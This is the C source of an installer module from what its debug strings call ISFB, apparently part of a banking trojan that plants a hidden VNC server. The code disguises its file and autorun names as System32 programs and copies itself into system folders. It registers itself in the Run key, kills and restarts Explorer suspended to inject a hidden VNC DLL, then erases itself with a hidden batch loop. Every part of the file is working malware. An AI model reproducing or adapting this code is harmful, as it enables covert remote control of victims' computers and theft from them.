//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: install.c
// $Revision: 179 $
// $Date: 2014-04-04 22:00:05 +0400 (Пт, 04 апр 2014) $
// description:
//	VNC server installer.

#include "..\common\common.h"
#include "..\acdll\image.h"
#include "..\acdll\activdll.h"
#include "..\vncdll\joiner.h"

// Original section name that will be created within a file
#define	CS_SECTION_NAME	".bss0"
#pragma section(CS_SECTION_NAME, read, write)

__declspec(allocate(CS_SECTION_NAME), align(1)) ULONG	g_MachineRandSeed = 0;

// Machine level random names
__declspec(allocate(CS_SECTION_NAME), align(1))	LPTSTR	g_ClientFileName;
__declspec(allocate(CS_SECTION_NAME), align(1))	LPTSTR	g_StartupValueName;


#define DOS_NAME_LEN		8+1+3+1	// 8.3 name size in chars with 0
#define	uInstallerSeed		0xE985589E
#define	GF_WOW64_PROCESS	1	

#define szFindExe			_T("\\*.exe")
#define	szExtExe			_T(".exe")
#define szBkSlash			_T("\\")
#define szBatFmt			_T("%lu.bat")
#define szBatchFile			_T("attrib -r -s -h %%1\r\n:%u\r\ndel %%1\r\nif exist %%1 goto %u\r\ndel %%0\r\n")


#define	szExplorerEvent		_T("Local\\ShellReadyEvent")
#define	szExplorerExe		_T("\"%s\\explorer.exe\"")
#define szAutoPath			_T("Software\\Microsoft\\Windows\\CurrentVersion\\Run")

#define	CRC_VNCDLL32		0x95efbcd4
#define	CRC_VNCDLL64		0x4a62d8c7


PVOID __stdcall	AppAlloc(ULONG Size)
{
	return(Alloc(Size));
}

VOID __stdcall	AppFree(PVOID pMem)
{
	Free(pMem);
}

PVOID __stdcall	AppRealloc(PVOID pMem, ULONG Size)
{
	return(Realloc(pMem, Size));
}


//
//	Returns a pointer to the current process SID structure.
//
BOOL GetProcessUserSID(
	DWORD	Pid, 
	PNT_SID pSid
	)
{
	NTSTATUS ntStatus;
	HANDLE	hProcess;
	OBJECT_ATTRIBUTES oa = {0};
	CLIENT_ID ClientId = { (HANDLE)(ULONG_PTR)Pid, 0 };
	HANDLE	hToken;
	ULONG	rSize = 0;
	LPTSTR	SidStr = NULL;
	BOOL	Ret = FALSE;

	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

	ntStatus = ZwOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION, &oa, &ClientId);
	
	if (NT_SUCCESS(ntStatus))
	{
		ntStatus = ZwOpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
		if (NT_SUCCESS(ntStatus))
		{
			PTOKEN_USER pUserInfo;
			ntStatus = ZwQueryInformationToken(hToken, TokenUser, NULL, 0, &rSize);

			pUserInfo = (PTOKEN_USER)Alloc(rSize);
			if (pUserInfo)
			{
				ntStatus = ZwQueryInformationToken(hToken, TokenUser, pUserInfo, rSize, &rSize);
				if (NT_SUCCESS(ntStatus))		
				{
					memcpy(pSid, pUserInfo->User.Sid, sizeof(NT_SID));
					Ret = TRUE;
				}
				Free(pUserInfo);
			}	// if (pUserInfo)
			ZwClose(hToken);
		}	// if (NT_SUCCESS(ntStatus))
		ZwClose(hProcess);
	}	// if (NT_SUCCESS(ntStatus))

	return(Ret);
}


//
//	Generates unique module name.
//
static BOOL GenModuleName(
	PULONG		pSeed,	// random seed 
	LPTSTR*		pName,	// receives the buffer with the name generated
	PULONG		pLen	// receives the length of the name in chars
	)
{
	BOOL	Ret = FALSE;
	LPTSTR	ModuleName, SystemDir;
	PWIN32_FIND_DATA FindFileData;
	ULONG	NameLen = 0;
	HANDLE	hFind;

	if (FindFileData = (PWIN32_FIND_DATA)Alloc(sizeof(WIN32_FIND_DATA)))
	{
		if (SystemDir = (LPTSTR)Alloc(MAX_PATH_BYTES))
		{
			if (ModuleName = (LPTSTR)Alloc(DOS_NAME_LEN*sizeof(_TCHAR)))
			{
				memset(ModuleName, 0, DOS_NAME_LEN*sizeof(_TCHAR));
				if (GetSystemDirectory(SystemDir, (MAX_PATH - cstrlen(szFindExe) - 1)))
				{
					ULONG i, Steps1, Steps2;

					// Initializing rand with machine seed value to generate the same name on the same machine
					Steps1 = RtlRandom(pSeed) & 0xff;
					Steps2 = RtlRandom(pSeed) & 0xff;

					lstrcat(SystemDir, szFindExe);
					if ((hFind = FindFirstFile(SystemDir, FindFileData)) != INVALID_HANDLE_VALUE)
					{
					
						for (i=0; (i<=Steps1 || i<=Steps2); i++)
						{
							if (i == Steps1 || i == Steps2)
							{
								ULONG nLen = (ULONG)(StrChr((LPTSTR)&FindFileData->cFileName,'.') - (LPTSTR)&FindFileData->cFileName);
								ULONG nPos = 0;
								if (NameLen && ((nPos = nLen-4) > nLen))
									nPos = 0;
								if (nLen>4)
									nLen = 4;
								memcpy(ModuleName+NameLen, &FindFileData->cFileName[nPos], nLen*sizeof(_TCHAR));
								NameLen += nLen;
							}	// if (i == Steps1 || i == Steps2)

							if (!FindNextFile(hFind, FindFileData))
									hFind = FindFirstFile(SystemDir, FindFileData);
						}	// for (i=0; 
						*pName = ModuleName;
						*pLen = NameLen;
						Ret = TRUE;
						FindClose(hFind);
					}	// if ((hFind =
				}	// if (GetSystemDirectory(

				if (!Ret)
					Free(ModuleName);
			}	// if (ModuleName =
			Free(SystemDir);
		}	// if (SystemDir = 
		Free(FindFileData);
	}	// if (FindFileData = 
	
	return(Ret);
}



//
//	Generates machine-specific pseudo random names.
//
static BOOL GenMachineLevelNames(VOID)
{
	BOOL Ret = FALSE;
	ULONG	cLen;
	ULONG	GuidSeed = g_MachineRandSeed;

	DbgPrint("ISFB: Generating machine-level names from seed 0x%08x\n", GuidSeed);

	do // not a loop
	{
		if (!GenModuleName(&g_MachineRandSeed, &g_StartupValueName, &cLen))
		{
			DbgPrint("ISFB: Failed generating main module name.\n");
			break;
		}
		
		if (!GenModuleName(&g_MachineRandSeed, &g_ClientFileName, &cLen))
		{
			DbgPrint("ISFB: Failed generating client dll module name.\n");
			break;
		}
		lstrcat(g_ClientFileName, szExtExe);

		Ret = TRUE;
	} while(FALSE);

	return(Ret);
}


//
//	Loads client DLLs attached to the current program image and initializes the specified AD_CONTEXT structure
//		with their pointers and sizes.
//
static BOOL InitAdContext(
	PAD_CONTEXT	pAdContext, 
	ULONG		Flags
	)
{
	BOOL Ret = FALSE;

	if (GetJoinedData((PIMAGE_DOS_HEADER)GetModuleHandle(NULL), (PCHAR*)&pAdContext->pModule32, (PULONG)&pAdContext->Module32Size, 0, CRC_VNCDLL32, 0))
	{
		if (!(Flags & INJECT_ARCH_X64) || 
			GetJoinedData((PIMAGE_DOS_HEADER)GetModuleHandle(NULL), (PCHAR*)&pAdContext->pModule64, (PULONG)&pAdContext->Module64Size, INJECT_ARCH_X64, CRC_VNCDLL64, 0))
		{
			Ret = TRUE;
		}	// if (!(Flags & INJECT_ARCH_X64) || LoadUnpackResource(_T("CLIENT64")...
		else
			Free((PVOID)pAdContext->pModule32);
	}	// if (LoadUnpackResource(_T("CLIENT32"), (PCHAR*)&AdContext.pModule32, (PULONG)&AdContext.Module32Size))

	return(Ret);
}



static	VOID WaitForExplorer(VOID)
{
	HANDLE hEvent;
	while ((hEvent = OpenEvent(SYNCHRONIZE, FALSE, szExplorerEvent)) == 0)
		Sleep(100);

	WaitForSingleObject(hEvent, INFINITE);
	CloseHandle(hEvent);
}


//
//	Restarts the Explorer process and injects client DLL into it.
//
static VOID ExecuteInject(
	ULONG	Flags
	)
{
	ULONG	ShellPid;
	HANDLE	hProcess;
	LPTSTR	ShellPath;
	ULONG	Size;
	AD_CONTEXT	AdContext = {0};

	// Loading our client DLL images and initilizing AD_CONTEXT
	if (InitAdContext(&AdContext, Flags))
	{
		// Initilizing ActiveDLL engine
		if (AcStartup(&AdContext, FALSE) == NO_ERROR)
		{
			PROCESS_INFORMATION Pi = {0};
			STARTUPINFO Si = {0};

			// Inject into the Windows shell process first.
			WaitForExplorer();
			// Looking for the Explorer process ID
			GetWindowThreadProcessId(GetShellWindow(), &ShellPid);

			// Obtaining the Explorer handle
			if (hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, ShellPid))
			{
				// Terminating the Explorer
				// ERROR_INVALID_FUNCTION as the exit code doesn't allow it to restart ;)
				TerminateProcess(hProcess, ERROR_INVALID_FUNCTION);
				CloseHandle(hProcess);
			}

			// Sometimes, when we being started by Windows autorun, PATH environment variable is not ready yet,
			//	so we have to construct full path to the Explorer executable here.
			Size = GetWindowsDirectory(NULL, 0) + cstrlen(szExplorerExe) + 1;
			if (ShellPath = Alloc(Size * 2 * sizeof(_TCHAR)))
			{
				GetWindowsDirectory(ShellPath + Size, Size);
				wsprintf(ShellPath, szExplorerExe, ShellPath + Size);

				// Starting new Explorer 
				Si.cb = sizeof(STARTUPINFO);
			
				PsSupDisableWow64Redirection();
				if (CreateProcess(NULL, ShellPath, NULL, NULL, FALSE, CREATE_DEFAULT_ERROR_MODE | CREATE_SUSPENDED, NULL, NULL, &Si, &Pi))
				{
					// Injecting our client DLL into the new Explorer
					AcInjectDll(&Pi, 0, _INJECT_AS_IMAGE);
					CloseHandle(Pi.hThread);
					CloseHandle(Pi.hProcess);
				}
				else
				{
					DbgPrint("ISFB: Unable to restart Windows Explorer error %u\n", GetLastError());
				}
				PsSupEnableWow64Redirection();

				Free(ShellPath);
			}	// if (ShellPath = Alloc(Size * sizeof(_TCHAR)))
		}	// if (AcStartup(&AdContext, FALSE) == NO_ERROR)

		if (Flags & INJECT_ARCH_X64)
			Free((PVOID)AdContext.pModule64);
		Free((PVOID)AdContext.pModule32);
	}	// if (InitAdContext(&AdContext, Flags))
}


//
//	Allocates a buffer an fills it with the full path of the executable file of the current process.
//  The caller is responsable for freeing the buffer.
//	If the function fails, the return value is NULL. To get extended error information, call GetLastError.
//
static LPTSTR GetCurrentProcessFilePath(VOID)
{
	ULONG	nSize = MAX_PATH;
	ULONG	rSize = 0;
	LPTSTR	FilePath = (LPTSTR)Alloc(nSize*sizeof(_TCHAR));

	while ((FilePath) && (rSize = GetModuleFileName(NULL, FilePath, nSize)) == nSize)
	{
		// Buffer is not large enough 
		Free(FilePath);
		nSize += MAX_PATH;
		FilePath = (LPTSTR)Alloc(nSize*sizeof(_TCHAR));
	}

	if ((FilePath) && (rSize == 0))
	{
		// GetModuleFileName() returned an error 
		Free(FilePath);
		FilePath = NULL;
	}

	return(FilePath);
}


//
//	Creates the BAT file with the specified name and content and runs it with the specified parameters string.
//
#pragma warning (push)
#pragma warning (disable: 4311)	//  'type cast' : pointer truncation from 'HINSTANCE' to 'WINERROR'
static WINERROR CreateAndStartBat(
			LPTSTR FilePath,		// Name of the BAT file to create
			PCHAR Content,			// Content of the BAT file
			LPTSTR ParamStr			// Parameters string for the BAT file
			)
{
	WINERROR Status = NO_ERROR;
	HANDLE hFile;
	ULONG Written;

	hFile = CreateFile(FilePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile != INVALID_HANDLE_VALUE)
	{

		if (!WriteFile(hFile, Content,(ULONG)lstrlen(Content), &Written, NULL))
			Status = GetLastError();

		CloseHandle(hFile);

		if (Status == NO_ERROR)
		{
			HINSTANCE hInst = ShellExecute(0, _T("open"), FilePath, ParamStr, NULL, SW_HIDE);
			if (hInst < (HINSTANCE)32)
				Status = (WINERROR)hInst;
		}
	}
	else
		Status = GetLastError();

	return(Status);
}
#pragma warning (pop)



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Creates a BAT file that attemts to delete this module in infinite loop.
//	Then this BAT file deletes itself.
//
static WINERROR DoSelfDelete(VOID)
{
	WINERROR Status = ERROR_UNSUCCESSFULL;
	LPTSTR	ThisFilePath = NULL, BatFilePath = NULL, BatFileParam = NULL, BatFileData;

	do 
	{
		LPTSTR	FileName;
		ULONG	NameLen;

		if (!(ThisFilePath = GetCurrentProcessFilePath()))
			break;

		NameLen = (ULONG)lstrlen(ThisFilePath);

		// It's guaranteed that BAT file path string will fit into the BatFilePath buffer 
		if (!(BatFilePath = (LPTSTR)Alloc((NameLen + DOS_NAME_LEN)*sizeof(_TCHAR))))
			break;

		if (!(BatFileParam = (LPTSTR)Alloc((NameLen+3)*sizeof(_TCHAR))))	// 2 chars for "" and one for 0
			break;

		lstrcpy(BatFilePath, ThisFilePath);
		FileName = strrchr(BatFilePath, *(_TCHAR*)szBkSlash);
		ASSERT(FileName);
		FileName += 1;

		wsprintf(FileName, szBatFmt, GetTickCount());
		wsprintf(BatFileParam, _T("\"%s\""), ThisFilePath);		

		if (BatFileData = Alloc(MAX_PATH * sizeof(_TCHAR)))
		{
			ULONG	Label = GetTickCount();

			wsprintf(BatFileData, szBatchFile, Label, Label);
			Status = CreateAndStartBat(BatFilePath,BatFileData, BatFileParam);
			Free(BatFileData);
		}
	}while (FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	if (ThisFilePath)
		Free(ThisFilePath);

	if (BatFilePath)
		Free(BatFilePath);

	if (BatFileParam)
		Free(BatFileParam);

	return(Status);
}


//
//	Attempts to copy the specified file into one of the system-specific folders.
//	Returns new fiel path if successfull.
//
static LPTSTR SaveApp(
	LPTSTR	SourcePath,	// source file path
	LPTSTR	ModuleName	// new file name
	)
{
	LPTSTR	FilePath = NULL;
	ULONG	ModuleNameLen = lstrlen(ModuleName);

	if (FilePath = (LPTSTR)Alloc(MAX_PATH_BYTES))
	{
		ULONG bSize;

		do 
		{
			// Try SystemDirectory first
			bSize = GetSystemDirectory(FilePath, MAX_PATH);
			if ((bSize+ModuleNameLen+2) <= MAX_PATH)
			{
				FilePath[bSize] = '\\';
				FilePath[bSize+1] = 0;
				lstrcat(FilePath, ModuleName);
				if (CopyFile(SourcePath, FilePath, FALSE))
					break;
			}

			// Try Windows directory
			bSize = GetWindowsDirectory(FilePath, MAX_PATH);
			if ((bSize+ModuleNameLen+2) <= MAX_PATH)
			{
				FilePath[bSize] = '\\';
				FilePath[bSize+1] = 0;
				lstrcat(FilePath, ModuleName); 
				if (CopyFile(SourcePath, FilePath, FALSE))
					break;
			}

			// Try current TEMP directory
			bSize = GetTempPath(MAX_PATH, FilePath);
			if ((bSize+ModuleNameLen+1) <= MAX_PATH)
			{
				FilePath[bSize] = 0;
				lstrcat(FilePath, ModuleName); 
				if (CopyFile(SourcePath, FilePath, FALSE))
					break;
			}

			// Try application current directory
			lstrcpy(FilePath, ModuleName);
			if (CopyFile(SourcePath, FilePath, FALSE))
				break;

			Free(FilePath);
			FilePath = NULL;
		} while (FALSE);
	}	// if (FilePath = 

	return(FilePath);
}


//
//	Copies current program file into one of the system folders and registers it within Windows autorun.
//
static BOOL InstallApp(
	ULONG	Flags
	)
{
	BOOL	Ret = TRUE;
	HKEY	hKey;
	ULONG	Size, Type = REG_SZ, KeyFlags = KEY_WOW64_32KEY;
	LPTSTR	RegFilePath, ThisFilePath;
	WINERROR Status;

	if (Flags & INJECT_ARCH_X64)
		KeyFlags = KEY_WOW64_64KEY;

	if (ThisFilePath = GetCurrentProcessFilePath())
	{
		// Check if this file already installed within Windows autorun
		Status = RegOpenKeyEx(HKEY_CURRENT_USER, szAutoPath, 0, (KeyFlags | KEY_ALL_ACCESS), &hKey);
		if (Status == NO_ERROR)
		{
			Size = (lstrlen(ThisFilePath) + 1) * sizeof(_TCHAR);
			ASSERT(Size);
			if (RegFilePath = Alloc(Size))
			{
				Status = RegQueryValueEx(hKey, g_StartupValueName, 0, &Type, RegFilePath, &Size);
				if (Status == NO_ERROR)
				{
					RegFilePath[(Size / sizeof(_TCHAR)) - 1] = 0;
					Status = lstrcmpi(RegFilePath, ThisFilePath);
				}
				Free(RegFilePath);
			}	// if (RegFilePath = Alloc(Size))
			else
				Status = ERROR_NOT_ENOUGH_MEMORY;

			if (Status != NO_ERROR)
			{
				// Application doesn't installed yet, installing
				if (RegFilePath = SaveApp(ThisFilePath, g_ClientFileName))
				{
					Status = RegSetValueEx(hKey, g_StartupValueName, 0, REG_SZ, RegFilePath, (lstrlen(RegFilePath) + 1) * sizeof(_TCHAR));
					if (Status != NO_ERROR)
					{
						DbgPrint("ISFB: Failed registering App within Windows autorun, error %u\n", Status); 
					}
					Free(RegFilePath);
				}
			}	// if (Status != NO_ERROR)
			else
				// Application already installed
				Ret = FALSE;
		
			RegCloseKey(hKey);
		}	// if (Status == NO_ERROR)
		else
		{
			DbgPrint("ISFB: Failed to open Windows autorun key\n");
		}
		Free(ThisFilePath);
	}	// if (ThisFilePath = GetCurrentProcessFilePath())

	return(Ret);
}



WINERROR StartApp(VOID)
{
	BOOL	bSelfDelete = TRUE;
	HANDLE	hMainMutex = 0;
	LPTSTR	ClientPath = NULL;
	ULONG	Flags = 0;
	WINERROR Status = ERROR_UNSUCCESSFULL;

	InitGlobals(GetModuleHandle(NULL), G_SYSTEM_VERSION | G_CURRENT_PROCESS_ID);

	do	// not a loop
	{
		NT_SID Sid = {0};
		LONG	i;

		// Obtaining current user SID and initializing rand seed with the hash of the machine ID taken from the SID
		if (!(GetProcessUserSID(g_CurrentProcessId, &Sid)))
		{
			DbgPrint("ISFB: Failed to resolve current user SID.\n");
			break;
		}

		if (Sid.SubcreatedityCount > 2)
		{
			for (i=0; i<(Sid.SubcreatedityCount-2); i++)
				g_MachineRandSeed += Sid.Subcreatedity[i+1];
		}

		// Randomizing installer-specific GUID values
		g_MachineRandSeed ^= uInstallerSeed;

		if (!GenMachineLevelNames())
		{
			DbgPrint("ISFB: Failed generating machine-level names.\n");
			break;
		}
		
		if (g_CurrentProcessFlags & GF_WOW64_PROCESS)
			Flags = INJECT_ARCH_X64;

 #ifdef _REGISTER_EXE
		bSelfDelete = InstallApp(Flags);
 #endif
		ExecuteInject(Flags);

		Status = NO_ERROR;
	} while(FALSE);


#if (!defined(_EXE_LOADER) || defined(_REGISTER_EXE))
	// Do not try to perform self delete if we don't register EXE coz in this case EXE is being started by a third-party loader
	if (bSelfDelete)
		// Initializing self-delete .bat
		DoSelfDelete();
#endif

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	return(Status);
}


//
//	 This is our application EntryPoint function.
//
WINERROR APIENTRY _tWinMain(
	HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPTSTR    lpCmdLine,
    int       nCmdShow
	)
{
	WINERROR Status = NO_ERROR;

	DbgPrint("ISFB: Version: 2.3\n");
	DbgPrint("ISFB: Started as win32 process 0x%x.\n", GetCurrentProcessId());

	Status = StartApp();

	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(nCmdShow);
	UNREFERENCED_PARAMETER(hInstance);

	DbgPrint("ISFB: Process 0x%x finished with status %u.\n", GetCurrentProcessId(), Status);

	return(Status);
}


//
//	 This is our application EntryPoint function to build it without CRT startup code.
//
INT _cdecl main(VOID)
{
	WINERROR Status = NO_ERROR;

	DbgPrint("ISFB: Started as win32 process 0x%x\n", GetCurrentProcessId());

	Status = StartApp();

	DbgPrint("ISFB: Process 0x%x finished with status %u\n", GetCurrentProcessId(), Status);

	return(Status);
}
